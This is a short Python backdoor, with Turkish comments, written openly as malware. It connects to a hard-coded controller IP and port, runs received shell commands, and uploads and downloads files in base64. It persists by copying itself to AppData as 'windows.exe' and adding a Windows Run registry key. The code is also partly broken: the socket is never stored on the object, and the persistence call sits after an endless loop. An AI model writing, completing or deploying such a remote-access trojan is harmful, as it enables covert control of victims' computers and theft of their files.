import socket
import subprocess
import simplejson
import os
import base64
import shutil
import sys

class Backdoor:

    def __init__(self,ip,port):   # Burada biz ilk once bu funksiya cagirilir cunki connection bu functiondur
        connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #baglanti ip ve portla yapilir, socket kutubanesi ile
        connection.connect((ip,port))
        connection.send("is connect")

    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        while True:
            try:
                json_data =self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_cd_execution(self,direktoryo):
        os.chdir(direktoryo)
    def get_file(self,file):
        with open(file,"rb") as my_file:
            return base64.b64encode(my_file.read())
    def save_file(self,file,content):
        with open(file,"wb") as my_file:
            my_file.write(base64.b64decode(content))

    def start_connection(self):
        while True:
            command = self.json_recv()
            try:
                if command[0] == "quit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    commnad_answer = self.command_cd_execution(command[1])
                elif command[0] == "download":
                    commnad_answer = self.get_file(command[1])
                elif command[0] == "upload":
                    commnad_answer = self.save_file(command[1],command[2])
                else:
                    commnad_answer = self.command_execution(command)
            except Exception:
                commnad_answer = "Error.."
            self.json_send(commnad_answer)

        self.connection.close()

def add_regedit():
    file = os.environ["AppData"] + "\\windows.exe"
    if not os.path.exists(file):
        shutil.copyfile(sys.executable,file)
        regedit = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windows /t REG_SZ /d " + file
        subprocess.call(regedit, shell=True)


my_backdoor = Backdoor("192.168.31.113",8080)
my_backdoor.start_connection()
add_regedit()
